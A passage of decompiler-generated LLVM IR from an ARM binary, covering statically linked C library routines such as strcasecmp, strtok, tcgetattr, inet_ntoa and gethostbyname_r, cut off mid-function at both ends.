  %v2_11c483849 = phi i1 [ %v2_11c4838, %thread-pre-split.loopexit ], [ false, %thread-pre-split.preheader ]
  %v0_11c3c.pr48 = phi i32 [ %v1_11c4c40, %thread-pre-split.loopexit ], [ %v0_11c0c, %thread-pre-split.preheader ]
  %v0_11c40547 = phi i32 [ %v1_11c34, %thread-pre-split.loopexit ], [ ptrtoint ([8 x i8]* @global_var_1a0fc.698 to i32), %thread-pre-split.preheader ]
  br label %dec_label_pc_11c30

dec_label_pc_11c48:                               ; preds = %bb
  br i1 %v2_11c48, label %dec_label_pc_11c54, label %bb26

bb26:                                             ; preds = %thread-pre-split.preheader, %dec_label_pc_11c48
  %v0_11c34.lcssa55 = phi i32 [ %v1_11c34, %dec_label_pc_11c48 ], [ ptrtoint ([8 x i8]* @global_var_1a0fc.698 to i32), %thread-pre-split.preheader ]
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_11c88

dec_label_pc_11c54:                               ; preds = %dec_label_pc_11c48, %entry
  %v3_11c58 = ashr i32 %v0_11c0c, 31
  %v5_11c6c = bitcast i32* %stack_var_-25 to i8*
  %v6_11c6c = call i32 @_uintmaxtostr(i8* %v5_11c6c, i32 %v0_11c0c, i32 %v3_11c58, i32 -10, i32 0)
  %v1_11c70 = add i32 %v6_11c6c, -14
  store i32 %v1_11c70, i32* @r5, align 4
  store i32 %v1_11c70, i32* @r0, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_1a0ec.700 to i32), i32* @r1, align 4
  store i32 14, i32* @r2, align 4
  %v0_11c80 = call i32 @memcpy()
  store i32 22, i32* %r7.global-to-local, align 4
  %v0_11c88.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_11c88

dec_label_pc_11c88:                               ; preds = %bb26, %dec_label_pc_11c54
  %v0_11c88 = phi i32 [ %v0_11c34.lcssa55, %bb26 ], [ %v0_11c88.pre, %dec_label_pc_11c54 ]
  %v1_11c88 = inttoptr i32 %v0_11c88 to i8*
  %v3_11c8c = call i32 @strlen(i8* %v1_11c88)
  %v0_11c90 = load i32, i32* @r8, align 4
  %v2_11c90 = icmp eq i32 %v0_11c90, 0
  %v1_11c94 = add i32 %v3_11c8c, 1
  store i32 %v1_11c94, i32* @r4, align 4
  br i1 %v2_11c90, label %bb27, label %dec_label_pc_11c88._crit_edge

dec_label_pc_11c88._crit_edge:                    ; preds = %dec_label_pc_11c88
  %v1_11c9c.pre = load i32, i32* @r6, align 4
  br label %bb28

bb27:                                             ; preds = %dec_label_pc_11c88
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_11c88._crit_edge, %bb27
  %v4_11ca0 = phi i32 [ %v1_11c9c.pre, %dec_label_pc_11c88._crit_edge ], [ 0, %bb27 ]
  %tmp56 = icmp ugt i32 %v1_11c94, %v4_11ca0
  br i1 %tmp56, label %bb29, label %.thread16

bb29:                                             ; preds = %bb28
  store i32 %v4_11ca0, i32* @r4, align 4
  store i32 34, i32* %r7.global-to-local, align 4
  br label %.thread16

.thread16:                                        ; preds = %bb28, %bb29
  %v0_11cb014 = phi i32 [ %v4_11ca0, %bb29 ], [ %v1_11c94, %bb28 ]
  %v2_11ca8 = icmp eq i32 %v0_11cb014, 0
  br i1 %v2_11ca8, label %dec_label_pc_11ccc, label %dec_label_pc_11cb0

dec_label_pc_11cb0:                               ; preds = %.thread16
  store i32 %v0_11cb014, i32* @r2, align 4
  %v0_11cb4 = load i32, i32* @r5, align 4
  store i32 %v0_11cb4, i32* @r1, align 4
  store i32 %v0_11c90, i32* @r0, align 4
  %v0_11cbc = call i32 @memcpy()
  %v0_11cc0 = load i32, i32* @r8, align 4
  %v1_11cc0 = load i32, i32* @r4, align 4
  %v2_11cc0 = add i32 %v1_11cc0, %v0_11cc0
  %v3_11cc8 = add i32 %v2_11cc0, -1
  %v4_11cc8 = inttoptr i32 %v3_11cc8 to i8*
  store i8 0, i8* %v4_11cc8, align 1
  br label %dec_label_pc_11ccc

dec_label_pc_11ccc:                               ; preds = %.thread16, %dec_label_pc_11cb0
  %v0_11ccc = load i32, i32* %r7.global-to-local, align 4
  %v2_11ccc = icmp eq i32 %v0_11ccc, 0
  br i1 %v2_11ccc, label %dec_label_pc_11cdc, label %dec_label_pc_11cd4

dec_label_pc_11cd4:                               ; preds = %dec_label_pc_11ccc
  %v0_11cd4 = call i32 @__errno_location()
  %v0_11cd8 = load i32, i32* %r7.global-to-local, align 4
  %v2_11cd8 = inttoptr i32 %v0_11cd4 to i32*
  store i32 %v0_11cd8, i32* %v2_11cd8, align 4
  %v0_11cdc.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_11cdc

dec_label_pc_11cdc:                               ; preds = %dec_label_pc_11ccc, %dec_label_pc_11cd4
  %v0_11cdc = phi i32 [ 0, %dec_label_pc_11ccc ], [ %v0_11cdc.pre, %dec_label_pc_11cd4 ]
  store i32 %v3_11c08, i32* @r4, align 4
  ret i32 %v0_11cdc

; uselistorder directives
  uselistorder i32 %v4_11ca0, { 1, 2, 0 }
  uselistorder i32 %v1_11c94, { 1, 0, 2 }
  uselistorder i32 %v1_11c34, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_11c0c, { 4, 3, 1, 2, 0 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 4, 0, 1, 5 }
  uselistorder label %dec_label_pc_11cdc, { 1, 0 }
  uselistorder label %dec_label_pc_11ccc, { 1, 0 }
  uselistorder label %.thread16, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %dec_label_pc_11c88, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @lr, align 4
  br label %dec_label_pc_11d00

dec_label_pc_11d00:                               ; preds = %bb8, %entry
  %v8_11d643 = phi i32 [ %v8_11d64, %bb8 ], [ 0, %entry ]
  %v0_11d58 = phi i32 [ %v1_11d58, %bb8 ], [ %arg2, %entry ]
  %v0_11d5c = phi i32 [ %v1_11d5c, %bb8 ], [ %tmp, %entry ]
  %v9_11d00 = icmp eq i32 %v0_11d5c, %v0_11d58
  br i1 %v9_11d00, label %dec_label_pc_11d00._crit_edge, label %dec_label_pc_11d08

dec_label_pc_11d00._crit_edge:                    ; preds = %dec_label_pc_11d00
  %.pre = inttoptr i32 %v0_11d58 to i8*
  br label %bb8

dec_label_pc_11d08:                               ; preds = %dec_label_pc_11d00
  %v1_11d0c = inttoptr i32 %v0_11d5c to i8*
  %v2_11d0c = load i8, i8* %v1_11d0c, align 1
  %v3_11d0c = zext i8 %v2_11d0c to i32
  %v1_11d10 = inttoptr i32 %v0_11d58 to i8*
  %v2_11d10 = load i8, i8* %v1_11d10, align 1
  %v3_11d10 = zext i8 %v2_11d10 to i32
  %v2_11d14 = load i32, i32* bitcast (i32** @global_var_24130.703 to i32*), align 4
  %v2_11d18 = mul nuw nsw i32 %v3_11d0c, 2
  store i32 %v2_11d18, i32* @ip, align 4
  %v2_11d1c = mul nuw nsw i32 %v3_11d10, 2
  %v2_11d20 = add i32 %v2_11d1c, %v2_11d14
  %v2_11d24 = add i32 %v2_11d14, %v2_11d18
  %v1_11d28 = add i32 %v2_11d24, 1
  %v2_11d28 = inttoptr i32 %v1_11d28 to i8*
  %v3_11d28 = load i8, i8* %v2_11d28, align 1
  %v4_11d28 = zext i8 %v3_11d28 to i32
  %v1_11d2c = add i32 %v2_11d20, 1
  %v2_11d2c = inttoptr i32 %v1_11d2c to i8*
  %v3_11d2c = load i8, i8* %v2_11d2c, align 1
  %v4_11d2c = zext i8 %v3_11d2c to i32
  %v3_11d30 = inttoptr i32 %v2_11d20 to i8*
  %v4_11d30 = load i8, i8* %v3_11d30, align 1
  %v6_11d30 = zext i8 %v4_11d30 to i32
  %v3_11d34 = inttoptr i32 %v2_11d24 to i8*
  %v4_11d34 = load i8, i8* %v3_11d34, align 1
  %v6_11d34 = zext i8 %v4_11d34 to i32
  %v3_11d38 = mul nuw i32 %v4_11d2c, 16777216
  %v3_11d3c = mul nuw i32 %v4_11d28, 16777216
  %v4_11d40 = sdiv i32 %v3_11d3c, 65536
  %v5_11d40 = or i32 %v6_11d34, %v4_11d40
  %v4_11d44 = sdiv i32 %v3_11d38, 65536
  %v5_11d44 = or i32 %v4_11d44, %v6_11d30
  %v2_11d48 = sub nsw i32 %v5_11d40, %v5_11d44
  %v9_11d48 = icmp eq i32 %v5_11d40, %v5_11d44
  br i1 %v9_11d48, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_11d08
  ret i32 %v2_11d48

bb8:                                              ; preds = %dec_label_pc_11d00._crit_edge, %dec_label_pc_11d08
  %v1_11d50.pre-phi = phi i8* [ %.pre, %dec_label_pc_11d00._crit_edge ], [ %v1_11d0c, %dec_label_pc_11d08 ]
  %v8_11d64 = phi i32 [ %v8_11d643, %dec_label_pc_11d00._crit_edge ], [ %v2_11d48, %dec_label_pc_11d08 ]
  %v2_11d50 = load i8, i8* %v1_11d50.pre-phi, align 1
  %v2_11d54 = icmp eq i8 %v2_11d50, 0
  %v1_11d58 = add i32 %v0_11d58, 1
  %v1_11d5c = add i32 %v0_11d5c, 1
  store i32 %v1_11d5c, i32* @lr, align 4
  br i1 %v2_11d54, label %dec_label_pc_11d64, label %dec_label_pc_11d00

dec_label_pc_11d64:                               ; preds = %bb8
  ret i32 %v8_11d64

; uselistorder directives
  uselistorder i32 %v1_11d5c, { 1, 0 }
  uselistorder i32 %v2_11d48, { 1, 0 }
  uselistorder i32 %v5_11d44, { 1, 0 }
  uselistorder i32 %v5_11d40, { 1, 0 }
  uselistorder i32 %v2_11d18, { 1, 0 }
  uselistorder i32 %v0_11d58, { 1, 2, 0, 3 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @strcasestr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v1_11d8016 = inttoptr i32 %arg2 to i8*
  br label %dec_label_pc_11d80.outer

dec_label_pc_11d80.outer:                         ; preds = %dec_label_pc_11de8, %entry
  %v0_11d94.ph = phi i32 [ %v1_11de8, %dec_label_pc_11de8 ], [ %tmp, %entry ]
  %v2_11d8017 = load i8, i8* %v1_11d8016, align 1
  %v2_11d8419 = icmp eq i8 %v2_11d8017, 0
  br i1 %v2_11d8419, label %dec_label_pc_11d94, label %dec_label_pc_11d9c

dec_label_pc_11d94:                               ; preds = %dec_label_pc_11d80.backedge, %dec_label_pc_11d80.outer
  ret i32 %v0_11d94.ph

dec_label_pc_11d9c:                               ; preds = %dec_label_pc_11d80.outer, %dec_label_pc_11d80.backedge
  %v1_11d8c25.in = phi i32 [ %v1_11d8c25, %dec_label_pc_11d80.backedge ], [ %arg2, %dec_label_pc_11d80.outer ]
  %v2_11d8023 = phi i8 [ %v2_11d80, %dec_label_pc_11d80.backedge ], [ %v2_11d8017, %dec_label_pc_11d80.outer ]
  %v2_11d8824.in.in = phi i8 [ %v2_11d80, %dec_label_pc_11d80.backedge ], [ %v2_11d8017, %dec_label_pc_11d80.outer ]
  %v0_11da422 = phi i32 [ %v1_11da4, %dec_label_pc_11d80.backedge ], [ %v0_11d94.ph, %dec_label_pc_11d80.outer ]
  %v1_11d8c25 = add i32 %v1_11d8c25.in, 1
  %v1_11d9c = inttoptr i32 %v0_11da422 to i8*
  %v2_11d9c = load i8, i8* %v1_11d9c, align 1
  %v9_11da0 = icmp eq i8 %v2_11d8023, %v2_11d9c
  %v1_11da4 = add i32 %v0_11da422, 1
  br i1 %v9_11da0, label %dec_label_pc_11d80.backedge, label %dec_label_pc_11db0

dec_label_pc_11d80.backedge:                      ; preds = %dec_label_pc_11d9c, %dec_label_pc_11db0
  %v1_11d80 = inttoptr i32 %v1_11d8c25 to i8*
  %v2_11d80 = load i8, i8* %v1_11d80, align 1
  %v2_11d84 = icmp eq i8 %v2_11d80, 0
  br i1 %v2_11d84, label %dec_label_pc_11d94, label %dec_label_pc_11d9c

dec_label_pc_11db0:                               ; preds = %dec_label_pc_11d9c
  %v2_11d8824.in = zext i8 %v2_11d8824.in.in to i32
  %v3_11d9c = zext i8 %v2_11d9c to i32
  %v2_11da8 = mul nuw nsw i32 %v3_11d9c, 2
  %v2_11d8824 = mul nuw nsw i32 %v2_11d8824.in, 2
  %v2_11db4 = load i32, i32* bitcast (i32** @global_var_24130.703 to i32*), align 4
  %v2_11db8 = add i32 %v2_11db4, %v2_11da8
  %v2_11dbc = add i32 %v2_11db4, %v2_11d8824
  %v1_11dc0 = add i32 %v2_11dbc, 1
  %v2_11dc0 = inttoptr i32 %v1_11dc0 to i8*
  %v3_11dc0 = load i8, i8* %v2_11dc0, align 1
  %v4_11dc0 = zext i8 %v3_11dc0 to i32
  %v1_11dc4 = add i32 %v2_11db8, 1
  %v2_11dc4 = inttoptr i32 %v1_11dc4 to i8*
  %v3_11dc4 = load i8, i8* %v2_11dc4, align 1
  %v4_11dc4 = zext i8 %v3_11dc4 to i32
  %v3_11dc8 = inttoptr i32 %v2_11db8 to i8*
  %v4_11dc8 = load i8, i8* %v3_11dc8, align 1
  %v6_11dc8 = zext i8 %v4_11dc8 to i32
  %v3_11dcc = inttoptr i32 %v2_11dbc to i8*
  %v4_11dcc = load i8, i8* %v3_11dcc, align 1
  %v6_11dcc = zext i8 %v4_11dcc to i32
  %v3_11dd0 = mul nuw i32 %v4_11dc0, 16777216
  %v3_11dd4 = mul nuw i32 %v4_11dc4, 16777216
  %v4_11dd8 = sdiv i32 %v3_11dd0, 65536
  %v5_11dd8 = or i32 %v6_11dcc, %v4_11dd8
  %v4_11ddc = sdiv i32 %v3_11dd4, 65536
  %v5_11ddc = or i32 %v4_11ddc, %v6_11dc8
  %v9_11de0 = icmp eq i32 %v5_11dd8, %v5_11ddc
  br i1 %v9_11de0, label %dec_label_pc_11d80.backedge, label %dec_label_pc_11de8

dec_label_pc_11de8:                               ; preds = %dec_label_pc_11db0
  %v1_11de8 = add i32 %v0_11d94.ph, 1
  %v2_11dec = icmp eq i8 %v2_11d9c, 0
  br i1 %v2_11dec, label %dec_label_pc_11dfc, label %dec_label_pc_11d80.outer

dec_label_pc_11dfc:                               ; preds = %dec_label_pc_11de8
  ret i32 0

; uselistorder directives
  uselistorder i8 %v2_11d80, { 2, 1, 0 }
  uselistorder i8 %v2_11d9c, { 0, 2, 1 }
  uselistorder i32 %v0_11da422, { 1, 0 }
  uselistorder i32 %v0_11d94.ph, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11d80.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_11d9c, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  store i32 ptrtoint (i32* @global_var_2a19c.706 to i32), i32* @r2, align 4
  %v0_11e0c = call i32 @strtok_r()
  %v0_11e10 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11e10, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %v0_11e0c

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-64 = alloca i32, align 4
  %v2_11e18 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_11e18, i32* @r1, align 4
  %v0_11e20 = call i32 @__GI_tcgetattr()
  %v1_11e24 = sub i32 1, %v0_11e20
  %v2_11e24 = icmp ult i32 %v0_11e20, 2
  br i1 %v2_11e24, label %bb4, label %bb

bb:                                               ; preds = %entry
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v5_11e30 = phi i32 [ %v1_11e24, %entry ], [ 0, %bb ]
  ret i32 %v5_11e30

; uselistorder directives
  uselistorder i32 %v0_11e20, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_2()
  %stack_var_-39 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_11e34 = load i32, i32* @r4, align 4
  %v6_11e34 = load i32, i32* @r5, align 4
  %v2_11e38 = ptrtoint i32* %stack_var_-56 to i32
  %v0_11e3c = load i32, i32* @r1, align 4
  store i32 %v0_11e3c, i32* %r6.global-to-local, align 4
  %v0_11e48 = load i32, i32* @r0, align 4
  %v3_11e48 = call i32 @ioctl(i32 %v0_11e48, i32 21505, i32 %v2_11e38)
  store i32 %v3_11e48, i32* %r7.global-to-local, align 4
  %v2_11e4c = icmp eq i32 %v3_11e48, 0
  %v2_11e54 = ptrtoint i32* %stack_var_-39 to i32
  store i32 %v2_11e54, i32* @r1, align 4
  %v0_11e5c = load i32, i32* %r6.global-to-local, align 4
  br i1 %v2_11e4c, label %dec_label_pc_11e64, label %dec_label_pc_11e90

dec_label_pc_11e64:                               ; preds = %entry
  %v1_11e5c = add i32 %v0_11e5c, 17
  %v4_11e6c = zext i8 %tmp to i32
  store i32 %v4_11e6c, i32* @r5, align 4
  %v2_11e70 = load i32, i32* %stack_var_-56, align 4
  %v1_11e74 = inttoptr i32 %v0_11e5c to i32*
  store i32 %v2_11e70, i32* %v1_11e74, align 4
  %v3_11e74 = add i32 %v0_11e5c, 4
  %v4_11e74 = inttoptr i32 %v3_11e74 to i32*
  %v5_11e74 = load i32, i32* @ip, align 4
  store i32 %v5_11e74, i32* %v4_11e74, align 4
  %v6_11e74 = add i32 %v0_11e5c, 8
  %v7_11e74 = inttoptr i32 %v6_11e74 to i32*
  %v8_11e74 = load i32, i32* @lr, align 4
  store i32 %v8_11e74, i32* %v7_11e74, align 4
  %v0_11e78 = load i32, i32* @r4, align 4
  %v1_11e78 = load i32, i32* %r6.global-to-local, align 4
  %v2_11e78 = add i32 %v1_11e78, 12
  %v3_11e78 = inttoptr i32 %v2_11e78 to i32*
  store i32 %v0_11e78, i32* %v3_11e78, align 4
  %v0_11e7c = load i32, i32* @r5, align 4
  %v1_11e7c = trunc i32 %v0_11e7c to i8
  %v2_11e7c = load i32, i32* %r6.global-to-local, align 4
  %v3_11e7c = add i32 %v2_11e7c, 16
  %v4_11e7c = inttoptr i32 %v3_11e7c to i8*
  store i8 %v1_11e7c, i8* %v4_11e7c, align 1
  %v4_11e80 = call i32 @__GI_mempcpy(i32 %v1_11e5c, i32 %v2_11e54, i32 19, i32 %v2_11e70)
  %v0_11e84 = load i32, i32* %r7.global-to-local, align 4
  store i32 13, i32* @r2, align 4
  %v2_11e8c = inttoptr i32 %v4_11e80 to i8*
  %v3_11e8c = call i32 @__GI_memset(i8* %v2_11e8c, i32 %v0_11e84)
  br label %dec_label_pc_11e90

dec_label_pc_11e90:                               ; preds = %entry, %dec_label_pc_11e64
  %v0_11e90 = phi i32 [ %v3_11e48, %entry ], [ %v0_11e84, %dec_label_pc_11e64 ]
  store i32 %v3_11e34, i32* @r4, align 4
  store i32 %v6_11e34, i32* @r5, align 4
  ret i32 %v0_11e90

; uselistorder directives
  uselistorder i32 %v0_11e5c, { 2, 1, 0, 3 }
  uselistorder i32 19, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 0, 2, 1 }
  uselistorder label %dec_label_pc_11e90, { 1, 0 }
}

define i32 @ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v2_11ebc = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v2_11ebc
}

define i32 @ntohs(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = mul i32 %arg1, 256
  %v1_11ecc = and i32 %tmp, 65280
  %tmp1 = udiv i32 %arg1, 256
  %v4_11ed0 = urem i32 %tmp1, 256
  %v5_11ed0 = or i32 %v4_11ed0, %v1_11ecc
  ret i32 %v5_11ed0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v2_11ef4 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v2_11ef4
}

define i32 @htons(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = mul i32 %arg1, 256
  %v1_11f04 = and i32 %tmp, 65280
  %tmp1 = udiv i32 %arg1, 256
  %v4_11f08 = urem i32 %tmp1, 256
  %v5_11f08 = or i32 %v4_11f08, %v1_11f04
  ret i32 %v5_11f08

; uselistorder directives
  uselistorder i32 65280, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__GI_inet_ntoa_r() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %v3_11f10 = load i32, i32* @r4, align 4
  %v6_11f10 = load i32, i32* @r5, align 4
  %v9_11f10 = load i32, i32* @r6, align 4
  %v0_11f14 = load i32, i32* @r0, align 4
  %v2_11f34 = call i32 @llvm.bswap.i32(i32 %v0_11f14)
  %v0_11f38 = load i32, i32* @r1, align 4
  %v1_11f38 = add i32 %v0_11f38, 15
  store i32 %v1_11f38, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11f64

dec_label_pc_11f44:                               ; preds = %dec_label_pc_11f64
  %v1_11f68 = urem i32 %v0_11f78, 256
  store i32 0, i32* %ip.global-to-local, align 4
  %v5_11f4c = inttoptr i32 %v0_11f84 to i8*
  %v6_11f4c = call i32 @_uintmaxtostr(i8* %v5_11f4c, i32 %v1_11f68, i32 0, i32 -10, i32 0)
  %v0_11f50 = load i32, i32* @r6, align 4
  %v2_11f50 = icmp eq i32 %v0_11f50, 0
  %v1_11f54 = add i32 %v6_11f4c, -1
  store i32 %v1_11f54, i32* %ip.global-to-local, align 4
  br i1 %v2_11f50, label %dec_label_pc_11f64.backedge, label %bb

dec_label_pc_11f64.backedge:                      ; preds = %bb, %dec_label_pc_11f44
  %storemerge.pre = phi i32 [ %storemerge.pre.pre, %bb ], [ %v1_11f54, %dec_label_pc_11f44 ]
  %v0_11f64.pre = load i32, i32* @r5, align 4
  %v0_11f68.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_11f64

bb:                                               ; preds = %dec_label_pc_11f44
  %v4_11f5c = inttoptr i32 %v0_11f50 to i8*
  store i8 46, i8* %v4_11f5c, align 1
  %storemerge.pre.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11f64.backedge

dec_label_pc_11f64:                               ; preds = %dec_label_pc_11f64.backedge, %entry
  %v0_11f84 = phi i32 [ %v1_11f38, %entry ], [ %storemerge.pre, %dec_label_pc_11f64.backedge ]
  %storemerge = phi i32 [ 0, %entry ], [ %storemerge.pre, %dec_label_pc_11f64.backedge ]
  %v0_11f78 = phi i32 [ %v2_11f34, %entry ], [ %v0_11f68.pre, %dec_label_pc_11f64.backedge ]
  %v0_11f7c = phi i32 [ 0, %entry ], [ %v0_11f64.pre, %dec_label_pc_11f64.backedge ]
  store i32 %storemerge, i32* @r6, align 4
  %v7_11f64 = icmp eq i32 %v0_11f7c, 3
  store i1 %v7_11f64, i1* @cpsr_z, align 1
  %v3_11f78 = udiv i32 %v0_11f78, 256
  store i32 %v3_11f78, i32* @r4, align 4
  %v1_11f7c = add i32 %v0_11f7c, 1
  store i32 %v1_11f7c, i32* @r5, align 4
  %v7_11f80 = icmp sgt i32 %v0_11f7c, 3
  br i1 %v7_11f80, label %dec_label_pc_11f84, label %dec_label_pc_11f44

dec_label_pc_11f84:                               ; preds = %dec_label_pc_11f64
  %v1_11f84 = add i32 %v0_11f84, 1
  store i32 %v3_11f10, i32* @r4, align 4
  store i32 %v6_11f10, i32* @r5, align 4
  store i32 %v9_11f10, i32* @r6, align 4
  ret i32 %v1_11f84

; uselistorder directives
  uselistorder i32 %v0_11f7c, { 2, 0, 1 }
  uselistorder i32 (i8*, i32, i32, i32, i32)* @_uintmaxtostr, { 2, 0, 1 }
}

define i32 @__GI_inet_ntoa(i32 %arg1) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_2a1a0.709 to i32), i32* @r1, align 4
  %v0_11f94 = call i32 @__GI_inet_ntoa_r()
  %v0_11f98 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11f98, label %bb, label %bb1

bb:                                               ; preds = %entry
  %v5_11f98 = udiv i32 %v0_11f94, 8
  %v6_11f98 = and i32 %v5_11f98, %arg1
  store i32 %v6_11f98, i32* @sl, align 4
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %v0_11f94

; uselistorder directives
  uselistorder i32 %v0_11f94, { 1, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_11fa0 = ptrtoint i32* %stack_var_-8 to i32
  %v0_11fa8 = load i32, i32* @r0, align 4
  %v2_11fa8 = inttoptr i32 %v0_11fa8 to i8*
  %v3_11fa8 = call i32 @inet_aton(i8* %v2_11fa8, i32 %v2_11fa0)
  %v2_11fac = icmp eq i32 %v3_11fa8, 0
  br i1 %v2_11fac, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v3_11fb4 = load i32, i32* %stack_var_-8, align 4
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v5_11fbc = phi i32 [ -1, %entry ], [ %v3_11fb4, %bb ]
  ret i32 %v5_11fbc

; uselistorder directives
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_11fc0 = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_11fcc = call i32 @__GI___h_errno_location()
  %v2_11fd0 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_11fd0, i32* @ip, align 4
  %v0_11fdc = load i32, i32* @r4, align 4
  %v7_11fec = call i32 @gethostbyname_r(i32 %v0_11fdc, i32* nonnull @global_var_2a37c.711, i32 ptrtoint (i32* @global_var_2a1b0.713 to i32), i32 460, i32 %v2_11fd0, i32 %v0_11fcc)
  %v3_11ff0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_11fc0, i32* @r4, align 4
  ret i32 %v3_11ff0
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v6_12004 = load i32, i32* @r5, align 4
  %v9_12004 = load i32, i32* @r6, align 4
  %v12_12004 = load i32, i32* @r7, align 4
  %v15_12004 = load i32, i32* @r8, align 4
  %v18_12004 = load i32, i32* @sb, align 4
  %v21_12004 = load i32, i32* @sl, align 4
  %v24_12004 = load i32, i32* @fp, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  %v0_12014 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12014, i32* @fp, align 4
  %v2_12014 = icmp eq i32 %v0_12014, 0
  store i32 0, i32* @r6, align 4
  store i32 %tmp, i32* @sl, align 4
  store i32 %arg4, i32* @r4, align 4
  %v2_12024 = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v2_12024, align 4
  br i1 %v2_12014, label %bb, label %dec_label_pc_12030

bb:                                               ; preds = %entry
  %v1_12028 = load i32, i32* %r0.global-to-local, align 4
  %v2_12028 = add i32 %v1_12028, 22
  store i32 %v2_12028, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12354

dec_label_pc_12030:                               ; preds = %entry
  %v0_12030 = call i32 @__errno_location()
  store i32 %v0_12030, i32* %r0.global-to-local, align 4
  %v3_12034 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_12034, i32* %ip.global-to-local, align 4
  %v1_12038 = inttoptr i32 %v0_12030 to i32*
  %v2_12038 = load i32, i32* %v1_12038, align 4
  store i32 %v2_12038, i32* @r8, align 4
  %v0_1203c = load i32, i32* @r6, align 4
  store i32 %v0_1203c, i32* %v1_12038, align 4
  %v0_12040 = load i32, i32* %ip.global-to-local, align 4
  store i32 %arg6, i32* %ip.global-to-local, align 4
  store i32 %v0_12030, i32* @r5, align 4
  %v0_12050 = load i32, i32* @fp, align 4
  store i32 %v0_12050, i32* %r0.global-to-local, align 4
  %v0_12054 = load i32, i32* @sl, align 4
  store i32 %v0_12054, i32* %r2.global-to-local, align 4
  %v0_12058 = load i32, i32* @r7, align 4
  store i32 %v0_12058, i32* %r3.global-to-local, align 4
  %v0_1205c = load i32, i32* @r4, align 4
  %v7_12064 = call i32 @__get_hosts_byname_r(i32 %v0_12050, i32 2, i32 %v0_12054, i32 %v0_12058, i32 %v0_1205c, i32 %v0_12040, i32 %arg6)
  store i32 %v7_12064, i32* %r0.global-to-local, align 4
  %v2_12068 = icmp eq i32 %v7_12064, 0
  br i1 %v2_12068, label %dec_label_pc_12354, label %dec_label_pc_12070

dec_label_pc_12070:                               ; preds = %dec_label_pc_12030
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v1_12074 = inttoptr i32 %arg6 to i32*
